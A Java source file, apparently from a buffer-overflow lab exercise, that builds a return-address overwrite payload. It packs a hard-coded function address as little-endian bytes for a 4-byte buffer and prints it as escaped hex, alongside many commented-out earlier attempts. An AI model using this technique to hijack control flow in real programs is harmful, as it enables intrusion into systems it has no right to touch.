import java.io.FileWriter;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;

public class AttackBackUp2 {

//    public static String constructAttackString(String targetAddress) {
//        // Construct the attack string
//        String padding = "A".repeat(4); // Fill the buffer (size 4) to overwrite the return address
//        String targetAddr = targetAddress; // Address of the target function
//        return padding + targetAddr; // Combine padding and target address
//    }

    public static String constructAttackString(String targetAddress) {
        StringBuilder attackString = new StringBuilder();
//        attackString.append("A".repeat(4));
        System.out.println("targetAddress: " + targetAddress);
//        String[] pairs = new String[targetAddress.length() / 2];

        for (int i = targetAddress.length() - 2, j = 0; i >= 0; i -= 2, j++) {
            //pairs[j] = "\\x" + targetAddress.substring(i, i + 2);
//            attackString.append("\\x" + targetAddress.substring(i, i + 2));
            attackString.append(targetAddress.substring(i, i + 2));
        }

        // Print the pairs
//        for (int i = 0; i < pairs.length; i++) {
//            System.out.println(pairs[i]);
//        }
        System.out.println("attackString: " + attackString);
        return attackString.toString();
//        System.exit(0);
        // Convert the target address to little-endian format
//        String[] addressBytes = targetAddress.split("(?<=\\G..)");
//        System.out.println("addressBytes: " + addressBytes.toString());
//        StringBuilder attackString = new StringBuilder();
//        for (int i = addressBytes.length - 1; i >= 0; i--) {
//            attackString.append((char) Integer.parseInt(addressBytes[i], 16));
//            System.out.println("aS: " + attackString);
//        }
//        System.out.println("Attack String: " +attackString);

        // Pad the attack string with 'A' characters to overflow the buffer
//        attackString.append("A".repeat(100 - addressBytes.length * 2)); // Each byte is represented by 2 hexadecimal characters
//
//        return attackString.toString();
    }

    public static void main(String[] args) {
//        // Address of the target() function
//        long targetAddress = 0x0804843b; // This address might change, verify it using gdb or a similar tool
        long targetAddress = 0x08049196; // This address might change, verify it using gdb or a similar tool

        // Check if the correct number of arguments is provided
//        if (args.length != 1) {
//            System.out.println("Usage: java Attack <target_function_address>");
//            System.exit(1);
//        }

        // Get the target function address from command line arguments
//        long targetAddress = Long.parseLong(args[0]);

        // Length of the buffer in the C program
        int bufferLength = 4;

        // Padding length to overflow the buffer
        int paddingLength = bufferLength + 4; // Adjust this value according to your system

        // Construct the attack string
        ByteBuffer buffer = ByteBuffer.allocate(paddingLength);
        buffer.order(ByteOrder.LITTLE_ENDIAN);
        buffer.putLong(targetAddress);
        byte[] padding = new byte[paddingLength - Long.BYTES];
        buffer.put(padding);

        // Print the attack string as hexadecimal bytes
        for (byte b : buffer.array()) {
            System.out.printf("\\x%02x", b);
        }
        System.out.println();
    }
}
